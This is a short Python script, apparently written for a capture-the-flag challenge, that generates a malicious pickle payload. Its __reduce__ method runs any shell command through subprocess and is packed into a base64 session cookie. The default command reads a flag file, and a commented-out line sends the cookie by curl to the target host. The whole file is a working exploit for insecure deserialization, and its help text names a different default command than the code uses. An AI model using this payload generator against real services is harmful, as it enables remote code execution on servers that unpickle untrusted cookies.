#!/bin/python3

import pickle,base64,os,sys

try:
	if(sys.argv[1] == "--help" or sys.argv[1] == "-h"):
		print("""\nUSAGE\n=====\n./pickle-payload-gen.py <payload>\n""")
		sys.exit()

	command = sys.argv[1]

except IndexError:
	print("\n[-] No payload specified sticking with default payload => id\n")
	command = "cat /flag_5fb2acebf1d0c558"


class PAYLOAD():
	def __reduce__(self):
		return (__import__('subprocess').getoutput, (command,))
		
cookie = base64.b64encode(pickle.dumps({"age": 1, "name": PAYLOAD()})).decode("utf-8")
print(cookie)
#os.system(f"curl http://h4ck3r.quest:8600/ --cookie 'session={cookie}'")